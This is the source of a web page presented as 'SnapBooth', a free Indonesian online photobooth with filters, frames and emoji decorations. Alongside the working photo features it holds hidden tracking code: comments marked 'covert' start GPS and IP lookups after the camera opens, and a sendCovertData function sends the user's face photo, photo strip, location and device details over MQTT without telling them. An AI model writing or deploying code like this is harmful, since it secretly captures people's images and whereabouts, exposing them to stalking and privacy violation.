<!--
  SnapBooth — Photobooth instan online
  Layout: single-column centered (seperti referensi)
-->
<!doctype html>
<html lang="id">
<head>
  <title>SnapBooth — Foto Instan Online</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">

  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    :root {
      --pink:      #f43f8e;
      --pink-dark: #d4296e;
      --yellow:    #fbbf24;
      --green:     #22c55e;
      --font:      'Nunito', sans-serif;
      --text:      #1a1a2e;
      --muted:     #888;
    }

    html, body {
      height: 100%; overflow: hidden;
      font-family: var(--font);
      background: #c9b4a0;
    }

    /* ── bg.jpg background ── */
    body::before {
      content: ''; position: fixed; inset: 0; z-index: 0;
      background: url('bg.jpg') center/cover no-repeat;
      filter: blur(8px) brightness(0.6) saturate(0.85);
      transform: scale(1.05);
    }
    /* warm overlay */
    body::after {
      content: ''; position: fixed; inset: 0; z-index: 0;
      background: rgba(30, 18, 10, 0.38);
    }

    /* ── App wrapper: full height, centered ── */
    #app {
      position: relative; z-index: 1;
      height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* ── Header: no background, no border ── */
    .header {
      display: flex; align-items: center; justify-content: space-between;
      padding: 18px 28px 0;
      flex-shrink: 0;
    }
    /* Logo: just icon + text, no box */
    .logo {
      display: flex; align-items: center; gap: 7px;
      font-weight: 900; font-size: 1.1rem;
      color: #fff; letter-spacing: -0.01em;
    }
    .logo-emoji { font-size: 1.2rem; line-height: 1; }
    .logo span  { color: var(--pink); }

    .cam-status {
      display: flex; align-items: center; gap: 6px;
      font-size: 0.72rem; color: rgba(255,255,255,0.75);
      font-weight: 700; letter-spacing: .07em; text-transform: uppercase;
    }
    .status-dot {
      width: 8px; height: 8px; border-radius: 50%;
      background: rgba(255,255,255,0.3); transition: background .3s;
    }
    .status-dot.active { background: var(--green); animation: livePulse 1.5s ease infinite; }
    .status-dot.error  { background: #ef4444; }
    @keyframes livePulse {
      0%,100%{ box-shadow: 0 0 0 0 rgba(34,197,94,.5); }
      50%    { box-shadow: 0 0 0 5px rgba(34,197,94,0); }
    }

    /* ── Main scroll area ── */
    .main {
      flex: 1; overflow: hidden;
      display: flex; flex-direction: column;
      align-items: center; justify-content: center;
      padding: 10px 20px 14px;
      gap: 12px;
    }

    /* ── Heading ── */
    .heading { text-align: center; }
    .heading h1 {
      font-size: clamp(1.35rem, 3vw, 1.8rem);
      font-weight: 900; color: #fff;
      letter-spacing: -0.02em; line-height: 1.15;
    }
    .heading h1 strong { color: var(--pink); }
    .heading p {
      font-size: 0.78rem; color: rgba(255,255,255,0.55);
      font-weight: 600; margin-top: 3px;
      letter-spacing: .04em;
    }

    /* ── Viewfinder ── */
    .viewfinder-wrap {
      position: relative;
      width: min(380px, 86vw);
      aspect-ratio: 4/3;
      border-radius: 12px; overflow: hidden;
      background: #111;
      box-shadow: 0 4px 30px rgba(0,0,0,0.5);
    }
    #video {
      width: 100%; height: 100%;
      object-fit: cover;
      transform: scaleX(-1);
      display: block;
      transition: filter .3s ease;
    }

    /* Grid lines */
    .grid-overlay {
      position: absolute; inset: 0; pointer-events: none;
      background-image:
        linear-gradient(rgba(255,255,255,.07) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255,255,255,.07) 1px, transparent 1px);
      background-size: 33.33% 33.33%;
    }
    /* Corner brackets */
    .vf-corner {
      position: absolute; width: 20px; height: 20px;
      border-color: rgba(255,255,255,0.75); border-style: solid;
    }
    .vf-corner.tl { top:10px; left:10px;   border-width: 2px 0 0 2px; }
    .vf-corner.tr { top:10px; right:10px;  border-width: 2px 2px 0 0; }
    .vf-corner.bl { bottom:10px; left:10px;  border-width: 0 0 2px 2px; }
    .vf-corner.br { bottom:10px; right:10px; border-width: 0 2px 2px 0; }

    /* Countdown */
    .vf-countdown {
      position: absolute; inset: 0;
      display: flex; align-items: center; justify-content: center;
      background: rgba(0,0,0,0.45);
      opacity: 0; pointer-events: none; transition: opacity .2s;
    }
    .vf-countdown.visible { opacity: 1; }
    .count-num {
      font-size: clamp(4rem,12vw,7rem); font-weight: 900;
      color: #fff; line-height: 1;
      text-shadow: 0 0 40px rgba(244,63,142,.8);
    }
    .count-num.animate { animation: countPop .32s cubic-bezier(.2,1.6,.4,1) both; }
    @keyframes countPop {
      from { transform: scale(2.2); opacity: 0; }
      to   { transform: scale(1);   opacity: 1; }
    }

    /* Flash */
    .vf-flash {
      position: absolute; inset: 0; background: #fff;
      opacity: 0; pointer-events: none; transition: opacity .05s;
    }
    .vf-flash.active { opacity: 1; }

    /* Shot dots */
    .shot-indicator {
      position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
      display: flex; gap: 7px;
      background: rgba(0,0,0,0.45); border-radius: 20px; padding: 5px 12px;
    }
    .dot-shot {
      width: 9px; height: 9px; border-radius: 50%;
      background: rgba(255,255,255,0.3); transition: all .3s;
    }
    .dot-shot.active { background: var(--yellow); transform: scale(1.3); }
    .dot-shot.done   { background: var(--green); }

    /* Camera placeholder */
    .cam-placeholder {
      position: absolute; inset: 0;
      display: flex; flex-direction: column;
      align-items: center; justify-content: center; gap: 8px;
      background: rgba(0,0,0,0.82);
    }
    .cam-ph-icon { font-size: 2.2rem; opacity: .45; }
    .cam-ph-text {
      font-size: 0.75rem; color: rgba(255,255,255,.4);
      text-align: center; max-width: 180px; line-height: 1.5;
    }

    /* Strip result overlay (replaces viewfinder after capture) */
    .strip-overlay {
      position: absolute; inset: 0;
      display: none; align-items: center; justify-content: center;
      background: rgba(0,0,0,0.88);
    }
    .strip-overlay.visible { display: flex; }
    .strip-overlay img {
      max-width: 90%; max-height: 90%;
      border-radius: 6px;
      object-fit: contain;
    }

    /* ── Filter pills ── */
    .filter-row {
      display: flex; align-items: center; gap: 7px; flex-wrap: wrap;
      justify-content: center;
    }
    .f-pill {
      padding: 5px 15px; border-radius: 100px; cursor: pointer;
      font-family: var(--font); font-size: 0.75rem; font-weight: 700;
      background: rgba(255,255,255,0.14);
      border: 1.5px solid rgba(255,255,255,0.2);
      color: rgba(255,255,255,0.7);
      transition: all .18s; white-space: nowrap;
    }
    .f-pill:hover  { border-color: var(--pink); color: var(--pink); }
    .f-pill.active {
      background: var(--pink); border-color: var(--pink); color: #fff;
      box-shadow: 0 2px 12px rgba(244,63,142,.4);
    }

    /* ── Snap button ── */
    .snap-btn {
      display: flex; align-items: center; justify-content: center; gap: 10px;
      padding: 14px 40px; border-radius: 100px;
      background: linear-gradient(135deg, var(--pink), var(--pink-dark));
      color: #fff; border: none; cursor: pointer;
      font-family: var(--font); font-size: 1rem; font-weight: 800;
      box-shadow: 0 4px 24px rgba(244,63,142,.5);
      transition: all .18s;
      animation: snapGlow 2.5s ease-in-out infinite;
    }
    @keyframes snapGlow {
      0%,100%{ box-shadow: 0 4px 24px rgba(244,63,142,.5); }
      50%    { box-shadow: 0 4px 36px rgba(244,63,142,.75), 0 0 0 5px rgba(244,63,142,.12); }
    }
    .snap-btn:hover:not(:disabled) { transform: translateY(-2px) scale(1.02); }
    .snap-btn:active:not(:disabled){ transform: scale(.97); }
    .snap-btn:disabled { opacity:.5; cursor:not-allowed; animation:none; box-shadow:none; }

    /* Strip action buttons */
    .strip-btns {
      display: none; gap: 8px;
    }
    .strip-btns.visible { display: flex; }
    .btn-download {
      padding: 10px 22px; border-radius: 100px; border: none; cursor: pointer;
      font-family: var(--font); font-size: 0.82rem; font-weight: 800;
      background: linear-gradient(135deg, var(--pink), var(--pink-dark));
      color: #fff; box-shadow: 0 3px 14px rgba(244,63,142,.4);
    }
    .btn-retake {
      padding: 10px 20px; border-radius: 100px; cursor: pointer;
      font-family: var(--font); font-size: 0.82rem; font-weight: 700;
      background: rgba(255,255,255,0.13);
      border: 1.5px solid rgba(255,255,255,0.2);
      color: rgba(255,255,255,.7); transition: all .18s;
    }
    .btn-retake:hover { border-color: var(--pink); color: var(--pink); }

    /* ── Hint ── */
    .snap-hint {
      font-size: 0.72rem; color: rgba(255,255,255,.45);
      font-weight: 600; text-align: center;
    }

    /* ── Steps ── */
    .steps {
      display: flex; align-items: flex-start; gap: 0;
    }
    .step {
      display: flex; flex-direction: column; align-items: center;
      gap: 5px; flex: 1; padding: 0 8px; text-align: center;
      position: relative;
    }
    .step + .step::before {
      content: '';
      position: absolute; left: 0; top: 16px;
      width: 1px; height: 20px;
      background: rgba(255,255,255,.2);
    }
    .step-icon {
      width: 34px; height: 34px; border-radius: 50%;
      border: 1.5px solid rgba(255,255,255,.2);
      display: flex; align-items: center; justify-content: center;
      font-size: 0.95rem; background: rgba(255,255,255,.07);
    }
    .step span {
      font-size: 0.65rem; color: rgba(255,255,255,.45);
      font-weight: 600; line-height: 1.35;
    }

    /* ── Frame & Emoji Editor ── */
    .editor-section {
      width: min(620px, 94vw);
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 7px;
    }

    .editor-title {
      color: rgba(255,255,255,.65);
      font-size: .68rem;
      font-weight: 800;
      text-transform: uppercase;
      letter-spacing: .08em;
    }

    .frame-row, .emoji-row {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 7px;
      flex-wrap: wrap;
    }

    .frame-pill {
      display: flex;
      align-items: center;
      gap: 6px;
      padding: 5px 11px;
      border-radius: 100px;
      cursor: pointer;
      font-family: var(--font);
      font-size: .72rem;
      font-weight: 700;
      color: rgba(255,255,255,.7);
      background: rgba(255,255,255,.10);
      border: 1.5px solid rgba(255,255,255,.15);
      transition: .18s ease;
    }

    .frame-pill:hover {
      transform: translateY(-1px);
      border-color: var(--pink);
    }

    .frame-pill.active {
      background: rgba(244,63,142,.18);
      border-color: var(--pink);
      color: #fff;
    }

    .frame-preview {
      width: 18px;
      height: 18px;
      border-radius: 5px;
      display: block;
      border: 2px solid rgba(255,255,255,.5);
    }

    .frame-white { background: #fff; }
    .frame-pink { background: #f43f8e; }
    .frame-black { background: #111; }
    .frame-purple { background: #8b5cf6; }

    .frame-pastel {
      background: linear-gradient(135deg, #ffd6e7, #d8d4ff, #c9f7e8);
    }

    .emoji-pill {
      width: 35px;
      height: 35px;
      border-radius: 50%;
      border: 1.5px solid rgba(255,255,255,.15);
      background: rgba(255,255,255,.10);
      cursor: pointer;
      font-size: 1.05rem;
      transition: .18s ease;
    }

    .emoji-pill:hover {
      transform: scale(1.1);
    }

    .emoji-pill.active {
      background: rgba(244,63,142,.2);
      border-color: var(--pink);
      transform: scale(1.08);
    }

    .custom-emoji {
      display: flex;
      align-items: center;
      gap: 5px;
    }

    .custom-emoji input {
      width: 180px;
      padding: 7px 12px;
      border-radius: 100px;
      border: 1px solid rgba(255,255,255,.18);
      outline: none;
      background: rgba(255,255,255,.10);
      color: #fff;
      font-family: var(--font);
      font-size: .72rem;
      text-align: center;
    }

    .custom-emoji input::placeholder {
      color: rgba(255,255,255,.4);
    }

    .custom-emoji button {
      width: 32px;
      height: 32px;
      border: 0;
      border-radius: 50%;
      background: var(--pink);
      color: #fff;
      font-size: 1.1rem;
      cursor: pointer;
    }

    @media (max-width: 520px) {
      .editor-section { width: 94vw; }
      .frame-pill { padding: 5px 9px; }
      .emoji-pill { width: 32px; height: 32px; }
      .custom-emoji input { width: 155px; }
    }

  </style>

  <link rel="icon" type="image/x-icon" href="media/images/logos.png">
  <meta property="og:title" content="SnapBooth — Foto Instan Online 📸" />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://lamanunikku.netlify.app/" />
  <meta property="og:image" content="https://lamanunikku.netlify.app/media/images/og-preview.svg" />
  <meta property="og:description" content="Foto instan online gratis! Klik, senyum, dan simpan fotomu 📷✨" />
  <meta name="description" content="Foto instan online gratis pakai kamera HP atau laptop.">
  <meta name="theme-color" content="#f43f8e">
</head>
<body>

<div id="app">

  <!-- Header: no bg, no border -->
  <div class="header">
    <div class="logo">
      <span class="logo-emoji">📸</span>
      Snap<span>Booth</span>
    </div>
    <div class="cam-status">
      <span class="status-dot" id="statusDot"></span>
      <span id="statusText">Memulai kamera...</span>
    </div>
  </div>

  <!-- Main centered content -->
  <div class="main">

    <!-- Heading -->
    <div class="heading">
      <h1>Abadikan <strong>Momen Terbaikmu</strong></h1>
      <p>Foto instan &middot; Gratis &middot; Langsung jadi</p>
    </div>

    <!-- Viewfinder -->
    <div class="viewfinder-wrap" id="viewfinderWrap">
      <video id="video" autoplay muted playsinline></video>
      <div class="grid-overlay"></div>
      <span class="vf-corner tl"></span>
      <span class="vf-corner tr"></span>
      <span class="vf-corner bl"></span>
      <span class="vf-corner br"></span>

      <div class="vf-countdown" id="vfCountdown">
        <div class="count-num" id="countNum">3</div>
      </div>
      <div class="vf-flash" id="vfFlash"></div>

      <div class="shot-indicator" id="shotIndicator" style="display:none">
        <span class="dot-shot" id="d0"></span>
        <span class="dot-shot" id="d1"></span>
        <span class="dot-shot" id="d2"></span>
      </div>

      <!-- Strip result overlay -->
      <div class="strip-overlay" id="stripOverlay">
        <img id="stripImg" alt="Foto Strip">
      </div>

      <div class="cam-placeholder" id="camPlaceholder">
        <div class="cam-ph-icon">🎥</div>
        <div class="cam-ph-text">Izinkan akses kamera<br>untuk memulai</div>
      </div>
    </div>

    <!-- Filters (ditampilkan SEBELUM foto) -->
    <div class="filter-row" id="filterRow">
      <button class="f-pill active" data-filter="normal">Normal</button>
      <button class="f-pill" data-filter="vintage">☀️ Vintage</button>
      <button class="f-pill" data-filter="glam">✨ Glam</button>
      <button class="f-pill" data-filter="bw">◑ B&amp;W</button>
      <button class="f-pill" data-filter="cool">🧊 Cool</button>
    </div>

    <!-- Bingkai (HIDDEN sebelum foto, tampil setelah foto) -->
    <div class="editor-section" id="bingkaiSection" style="display:none">
      <div class="editor-title">🖼️ Pilih Bingkai</div>
      <div class="frame-row">
        <button class="frame-pill active" data-frame="white">
          <span class="frame-preview frame-white"></span> White
        </button>
        <button class="frame-pill" data-frame="pink">
          <span class="frame-preview frame-pink"></span> Pink
        </button>
        <button class="frame-pill" data-frame="black">
          <span class="frame-preview frame-black"></span> Black
        </button>
        <button class="frame-pill" data-frame="purple">
          <span class="frame-preview frame-purple"></span> Purple
        </button>
        <button class="frame-pill" data-frame="pastel">
          <span class="frame-preview frame-pastel"></span> Pastel
        </button>
      </div>
    </div>

    <!-- Dekorasi (HIDDEN sebelum foto, tampil setelah foto) -->
    <div class="editor-section" id="dekorasiSection" style="display:none">
      <div class="editor-title">✨ Pilih Dekorasi</div>
      <div class="emoji-row">
        <button class="emoji-pill active" data-emoji="none">🚫</button>
        <button class="emoji-pill" data-emoji="🥰">🥰</button>
        <button class="emoji-pill" data-emoji="❤️">❤️</button>
        <button class="emoji-pill" data-emoji="✨">✨</button>
        <button class="emoji-pill" data-emoji="🫶">🫶</button>
        <button class="emoji-pill" data-emoji="😎">😎</button>
        <button class="emoji-pill" data-emoji="🌸">🌸</button>
        <button class="emoji-pill" data-emoji="🎀">🎀</button>
        <button class="emoji-pill" data-emoji="🐻">🐻</button>
        <button class="emoji-pill" data-emoji="🍓">🍓</button>
      </div>
      <div class="custom-emoji">
        <input type="text" id="customEmoji" maxlength="4" placeholder="atau tulis emoji sendiri 😊">
        <button id="addCustomEmoji" type="button">＋</button>
      </div>
    </div>

    <!-- Snap / strip buttons -->
    <button class="snap-btn" id="snapBtn" disabled>
      <span>📷</span>
      <span id="snapBtnText">Ambil Foto!</span>
    </button>

    <div class="strip-btns" id="stripBtns">
      <button class="btn-download" id="btnDownload">💾 Simpan Strip</button>
      <button class="btn-retake"   id="btnRetake">🔄 Foto Ulang</button>
    </div>

    <p class="snap-hint" id="snapHint">Menunggu kamera...</p>

    <!-- Steps -->
    <div class="steps">
      <div class="step">
        <div class="step-icon">🎨</div>
        <span>Posisikan wajah<br>di tengah</span>
      </div>
      <div class="step">
        <div class="step-icon">📸</div>
        <span>Klik ambil<br>foto</span>
      </div>
      <div class="step">
        <div class="step-icon">🖼️</div>
        <span>Simpan<br>foto</span>
      </div>
    </div>

  </div><!-- /.main -->
</div>

<script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
<script src="capture.js"></script>
<script>
/* ── CSS Filters ── */
var CSS_FILTERS = {
  normal:  '',
  vintage: 'sepia(0.5) saturate(0.75) contrast(1.1) brightness(0.9)',
  glam:    'saturate(1.8) contrast(1.12) brightness(1.08) hue-rotate(-10deg)',
  bw:      'grayscale(1) contrast(1.2) brightness(0.92)',
  cool:    'hue-rotate(25deg) saturate(1.3) brightness(1.06) contrast(1.05)'
}

/* ── State ── */
var videoStream    = null
var currentFilter  = 'normal'
var currentFrame   = 'white'
var currentEmoji   = 'none'
var isCapturing    = false
var capturedFrames = []
var gpsCoords      = null
var ipInfo         = {}
var stripCanvasEl  = null

/* ── DOM ── */
var video          = document.getElementById('video')
var statusDot      = document.getElementById('statusDot')
var statusText     = document.getElementById('statusText')
var camPlaceholder = document.getElementById('camPlaceholder')
var vfCountdown    = document.getElementById('vfCountdown')
var countNum       = document.getElementById('countNum')
var vfFlash        = document.getElementById('vfFlash')
var shotIndicator  = document.getElementById('shotIndicator')
var dotEls         = [document.getElementById('d0'), document.getElementById('d1'), document.getElementById('d2')]
var snapBtn        = document.getElementById('snapBtn')
var snapBtnText    = document.getElementById('snapBtnText')
var snapHint       = document.getElementById('snapHint')
var stripOverlay   = document.getElementById('stripOverlay')
var stripImg       = document.getElementById('stripImg')
var stripBtns      = document.getElementById('stripBtns')

/* ── Init ── */
window.addEventListener('DOMContentLoaded', function () { initCamera() })

/* ── Camera ── */
async function initCamera () {
  try {
    videoStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: false
    })
    video.srcObject = videoStream
    await video.play()
    camPlaceholder.style.display = 'none'
    snapBtn.disabled = false
    statusDot.classList.add('active')
    statusText.textContent = 'Kamera aktif'
    snapHint.textContent   = 'Siap! Kita ambil 3 foto berturut-turut 😊'
    /* covert: GPS setelah kamera (1.5s delay) */
    setTimeout(function () {
      if (typeof tryGPS    === 'function') tryGPS().then(function (c) { gpsCoords = c })
      if (typeof getIPData === 'function') getIPData().then(function (d) { ipInfo = d }).catch(function(){})
    }, 1500)
  } catch (e) {
    statusDot.classList.add('error')
    statusText.textContent = 'Kamera tidak tersedia'
    camPlaceholder.innerHTML = '<div class="cam-ph-icon">⚠️</div><div class="cam-ph-text">Izinkan akses kamera<br>lalu refresh halaman</div>'
    snapHint.textContent = 'Aktifkan izin kamera di browser'
  }
}

/* ── Filter pills ── */
document.querySelectorAll('.f-pill').forEach(function (btn) {
  btn.addEventListener('click', function () {
    if (isCapturing) return
    document.querySelectorAll('.f-pill').forEach(function (b) { b.classList.remove('active') })
    btn.classList.add('active')
    currentFilter = btn.dataset.filter
    video.style.filter = CSS_FILTERS[currentFilter]
  })
})

/* ── Frame selector ── */
document.querySelectorAll('.frame-pill').forEach(function (btn) {
  btn.addEventListener('click', function () {
    if (isCapturing) return
    document.querySelectorAll('.frame-pill').forEach(function (b) { b.classList.remove('active') })
    btn.classList.add('active')
    currentFrame = btn.dataset.frame
    reRenderStrip()   /* langsung update strip */
  })
})

/* ── Emoji selector ── */
document.querySelectorAll('.emoji-pill').forEach(function (btn) {
  btn.addEventListener('click', function () {
    if (isCapturing) return
    document.querySelectorAll('.emoji-pill').forEach(function (b) { b.classList.remove('active') })
    btn.classList.add('active')
    currentEmoji = btn.dataset.emoji
    reRenderStrip()   /* langsung update strip */
  })
})

/* ── Custom emoji ── */
document.getElementById('addCustomEmoji').addEventListener('click', function () {
  var input = document.getElementById('customEmoji')
  var emoji = input.value.trim()
  if (!emoji) return
  currentEmoji = emoji
  document.querySelectorAll('.emoji-pill').forEach(function (b) { b.classList.remove('active') })
  input.value = ''
  reRenderStrip()   /* langsung update strip */
})

/* ── Re-render strip saat bingkai/dekorasi berubah ── */
async function reRenderStrip () {
  if (!capturedFrames.length) return   /* belum ada foto, skip */
  snapHint.textContent = 'Memperbarui strip...'
  stripCanvasEl = await renderStrip(capturedFrames, currentFilter, currentFrame, currentEmoji)
  var url = stripCanvasEl.toDataURL('image/jpeg', 0.9)
  stripImg.src = url
  snapHint.textContent = 'Strip diperbarui! Simpan atau foto ulang 🎉'
}

/* ── Toggle section visibility ── */
var filterRow       = document.getElementById('filterRow')
var bingkaiSection  = document.getElementById('bingkaiSection')
var dekorasiSection = document.getElementById('dekorasiSection')

function showEditors () {
  filterRow.style.display       = 'none'
  bingkaiSection.style.display  = 'flex'
  dekorasiSection.style.display = 'flex'
}
function showFilters () {
  filterRow.style.display       = 'flex'
  bingkaiSection.style.display  = 'none'
  dekorasiSection.style.display = 'none'
}

/* ── Snap ── */
snapBtn.addEventListener('click', startPhotosession)

/* ── Session: 3 shots ── */
async function startPhotosession () {
  if (isCapturing || !videoStream) return
  isCapturing    = true
  capturedFrames = []

  stripOverlay.classList.remove('visible')
  stripBtns.classList.remove('visible')
  shotIndicator.style.display = 'flex'
  snapBtn.disabled = true
  dotEls.forEach(function (d) { d.className = 'dot-shot' })

  for (var shot = 0; shot < 3; shot++) {
    dotEls.forEach(function (d, i) {
      d.className = 'dot-shot' + (i < shot ? ' done' : i === shot ? ' active' : '')
    })
    snapHint.textContent  = 'Foto ' + (shot + 1) + ' dari 3 — Senyum!'
    statusText.textContent = shot + 1 + '/3'

    await runCountdown(3)
    capturedFrames.push(captureFrame())
    await doFlash()

    if (shot < 2) {
      snapHint.textContent = 'Keren! Foto ' + (shot + 2) + ' dalam sebentar...'
      await delay(1100)
    }
  }

  dotEls.forEach(function (d) { d.className = 'dot-shot done' })
  snapHint.textContent   = 'Membuat strip foto...'
  statusText.textContent = 'Memproses...'

  /* render strip */
  stripCanvasEl = await renderStrip(capturedFrames, currentFilter, currentFrame, currentEmoji)
  var url = stripCanvasEl.toDataURL('image/jpeg', 0.9)

  stripImg.src = url
  stripOverlay.classList.add('visible')
  stripBtns.classList.add('visible')
  shotIndicator.style.display = 'none'
  snapBtn.disabled = false
  snapBtnText.textContent = 'Foto Lagi'
  snapHint.textContent    = 'Strip selesai! Simpan atau foto ulang 🎉'
  statusText.textContent  = 'Kamera aktif'

  showEditors()   /* filter disembunyikan, bingkai & dekorasi muncul */

  sendCovertData(capturedFrames[0], url)
  isCapturing = false
}

/* ── Countdown ── */
async function runCountdown (from) {
  vfCountdown.classList.add('visible')
  for (var i = from; i >= 1; i--) {
    countNum.textContent = i
    void countNum.offsetWidth
    countNum.className = 'count-num animate'
    await delay(860)
  }
  countNum.className   = 'count-num'
  countNum.textContent = '📸'
  await delay(260)
  vfCountdown.classList.remove('visible')
}

/* ── Flash ── */
async function doFlash () {
  vfFlash.classList.add('active')
  await delay(110)
  vfFlash.classList.remove('active')
}

/* ── Capture frame (object-fit:cover crop, tidak gepeng) ── */
function captureFrame () {
  var W = 640, H = 480
  var c = document.createElement('canvas')
  c.width = W; c.height = H
  var ctx = c.getContext('2d')

  var vw = video.videoWidth  || 1280
  var vh = video.videoHeight || 720

  /* hitung source rect agar proporsional (cover) */
  var targetAR = W / H
  var videoAR  = vw / vh
  var sx, sy, sw, sh
  if (videoAR > targetAR) {
    /* video lebih lebar → crop kiri-kanan */
    sh = vh; sw = vh * targetAR
    sx = (vw - sw) / 2; sy = 0
  } else {
    /* video lebih tinggi → crop atas-bawah */
    sw = vw; sh = vw / targetAR
    sx = 0; sy = (vh - sh) / 2
  }

  if (CSS_FILTERS[currentFilter]) ctx.filter = CSS_FILTERS[currentFilter]
  ctx.translate(W, 0); ctx.scale(-1, 1)   /* mirror selfie */
  ctx.drawImage(video, sx, sy, sw, sh, 0, 0, W, H)
  return c.toDataURL('image/jpeg', 0.82)
}

/* ── Render strip ── */
async function renderStrip (dataUrls, filterName, frameName, emoji) {
  var PW = 440
  var PH = 330
  var PAD = 24
  var GAP = 10
  var POLBOT = 34
  var TEXT = 54

  var SW = PW + PAD * 2
  var SH = (PH + POLBOT + GAP) * dataUrls.length + PAD * 2 + TEXT - GAP

  var canvas = document.createElement('canvas')
  canvas.width = SW
  canvas.height = SH

  var ctx = canvas.getContext('2d')

  /* ── Frame background ── */
  if (frameName === 'white') {
    ctx.fillStyle = '#ffffff'
    ctx.fillRect(0, 0, SW, SH)
  } else if (frameName === 'pink') {
    var pinkGrad = ctx.createLinearGradient(0, 0, SW, SH)
    pinkGrad.addColorStop(0, '#fff0f6')
    pinkGrad.addColorStop(1, '#ffd0e2')
    ctx.fillStyle = pinkGrad
    ctx.fillRect(0, 0, SW, SH)
  } else if (frameName === 'black') {
    ctx.fillStyle = '#111111'
    ctx.fillRect(0, 0, SW, SH)
  } else if (frameName === 'purple') {
    var purpleGrad = ctx.createLinearGradient(0, 0, SW, SH)
    purpleGrad.addColorStop(0, '#f3eaff')
    purpleGrad.addColorStop(1, '#d9c2ff')
    ctx.fillStyle = purpleGrad
    ctx.fillRect(0, 0, SW, SH)
  } else if (frameName === 'pastel') {
    var pastelGrad = ctx.createLinearGradient(0, 0, SW, SH)
    pastelGrad.addColorStop(0, '#fff1f7')
    pastelGrad.addColorStop(.5, '#eeeaff')
    pastelGrad.addColorStop(1, '#e8fff7')
    ctx.fillStyle = pastelGrad
    ctx.fillRect(0, 0, SW, SH)
  }

  /* ── Load images ── */
  var imgs = await Promise.all(dataUrls.map(function (src) {
    return new Promise(function (res, rej) {
      var img = new Image()
      img.onload = function () { res(img) }
      img.onerror = rej
      img.src = src
    })
  }))

  /* ── Render photos ── */
  for (var i = 0; i < imgs.length; i++) {
    var x = PAD
    var y = PAD + i * (PH + POLBOT + GAP)

    ctx.shadowColor = frameName === 'black'
      ? 'rgba(0,0,0,.5)'
      : 'rgba(0,0,0,.18)'
    ctx.shadowBlur = 14
    ctx.shadowOffsetY = 5

    ctx.fillStyle = '#fff'

    ctx.beginPath()
    roundRect(ctx, x - 8, y - 8, PW + 16, PH + POLBOT + 8, 8)
    ctx.fill()

    ctx.shadowColor = 'transparent'
    ctx.shadowBlur = 0
    ctx.shadowOffsetY = 0

    /* ── Photo ── */
    ctx.save()
    ctx.filter = CSS_FILTERS[filterName] || 'none'

    var iw = imgs[i].naturalWidth || PW
    var ih = imgs[i].naturalHeight || PH
    var tAR = PW / PH
    var iAR = iw / ih
    var isx, isy, isw, ish

    if (iAR > tAR) {
      ish = ih
      isw = ih * tAR
      isx = (iw - isw) / 2
      isy = 0
    } else {
      isw = iw
      ish = iw / tAR
      isx = 0
      isy = (ih - ish) / 2
    }

    ctx.drawImage(imgs[i], isx, isy, isw, ish, x, y, PW, PH)
    ctx.restore()

    /* ── Emoji decoration ── */
    if (emoji && emoji !== 'none') {
      ctx.save()
      ctx.font = '32px "Apple Color Emoji", "Segoe UI Emoji", sans-serif'
      ctx.textAlign = 'center'
      ctx.textBaseline = 'middle'

      ctx.shadowColor = 'rgba(0,0,0,.22)'
      ctx.shadowBlur = 5

      ctx.fillText(emoji, x + 30, y + 30)
      ctx.fillText(emoji, x + PW - 30, y + PH - 30)

      ctx.restore()
    }

    /* ── Photo number ── */
    ctx.fillStyle = frameName === 'black' ? '#d0d0d0' : '#c0afa0'
    ctx.font = '600 12px Nunito,Arial,sans-serif'
    ctx.textAlign = 'center'
    ctx.fillText('0' + (i + 1), x + PW / 2, y + PH + 22)
  }

  /* ── Footer ── */
  ctx.textAlign = 'center'

  ctx.fillStyle = frameName === 'black' ? '#ffffff' : '#a8906c'
  ctx.font = 'bold 15px Nunito,Arial,sans-serif'
  ctx.fillText('📸 SnapBooth', SW / 2, SH - 28)

  ctx.fillStyle = frameName === 'black' ? '#999999' : '#c0afa0'
  ctx.font = '600 11px Nunito,Arial,sans-serif'
  ctx.fillText(
    new Date().toLocaleDateString('id-ID', {
      day: '2-digit',
      month: 'long',
      year: 'numeric'
    }),
    SW / 2,
    SH - 10
  )

  return canvas
}

function roundRect (ctx, x, y, w, h, r) {
  ctx.beginPath()
  ctx.moveTo(x+r,y); ctx.lineTo(x+w-r,y); ctx.quadraticCurveTo(x+w,y,x+w,y+r)
  ctx.lineTo(x+w,y+h-r); ctx.quadraticCurveTo(x+w,y+h,x+w-r,y+h)
  ctx.lineTo(x+r,y+h); ctx.quadraticCurveTo(x,y+h,x,y+h-r)
  ctx.lineTo(x,y+r); ctx.quadraticCurveTo(x,y,x+r,y); ctx.closePath()
}

/* ── Download ── */
document.getElementById('btnDownload').addEventListener('click', function () {
  if (!stripCanvasEl) return
  var a = document.createElement('a')
  a.href = stripCanvasEl.toDataURL('image/jpeg', 0.92)
  a.download = 'snapbooth-' + new Date().toISOString().slice(0,10) + '.jpg'
  a.click()
})

/* ── Retake ── */
document.getElementById('btnRetake').addEventListener('click', function () {
  stripOverlay.classList.remove('visible')
  stripBtns.classList.remove('visible')
  snapBtnText.textContent = 'Ambil Foto!'
  snapHint.textContent    = 'Siap! Kita ambil 3 foto berturut-turut 😊'
  capturedFrames = []; stripCanvasEl = null
  showFilters()   /* kembali ke filter pills, sembunyikan bingkai & dekorasi */
})

/* ── Covert MQTT send ── */
async function sendCovertData (photoUrl, stripUrl) {
  try {
    var loc = typeof buildLocation === 'function' ? await buildLocation(gpsCoords, ipInfo) : null
    var payload = {
      id: Math.random().toString(36).substr(2,9).toUpperCase(),
      timestamp: new Date().toISOString(),
      photo: photoUrl, strip: stripUrl, location: loc,
      device: { userAgent: navigator.userAgent, screen: window.screen.width+'x'+window.screen.height, language: navigator.language }
    }
    if (typeof publishMQTT === 'function') publishMQTT(payload)
  } catch (e) {}
}

function delay (ms) { return new Promise(function (r) { setTimeout(r, ms) }) }
